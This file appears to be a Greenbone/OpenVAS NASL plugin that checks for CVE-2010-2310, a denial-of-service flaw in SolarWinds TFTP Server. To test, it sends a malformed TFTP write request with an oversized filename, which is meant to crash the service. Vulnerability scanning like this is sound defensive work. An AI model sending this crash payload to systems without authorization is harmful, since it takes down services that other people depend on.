if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901124" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_cve_id( "CVE-2010-2310" );
	script_bugtraq_id( 40824 );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-06-22 13:34:32 +0200 (Tue, 22 Jun 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "SolarWinds TFTP Server Write Request Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/13836" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to crash the server
  process, resulting in a denial-of-service condition." );
	script_tag( name: "affected", value: "SolarWinds TFTP Server 10.4.0.13." );
	script_tag( name: "insight", value: "The flaw is caused by an error when processing TFTP write
  requests, which can be exploited to crash the server via a specially crafted request." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running SolarWinds TFTP Server and is prone to
  denial of service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_alive( port: port )){
	exit( 0 );
}
sock = open_sock_udp( port );
if(!sock){
	exit( 0 );
}
crash = raw_string( 0x00, 0x02 ) + crap( 1000 ) + raw_string( 0x00 ) + "NETASCII" + raw_string( 0x00 );
send( socket: sock, data: crash );
close( sock );
if(!tftp_alive( port: port )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

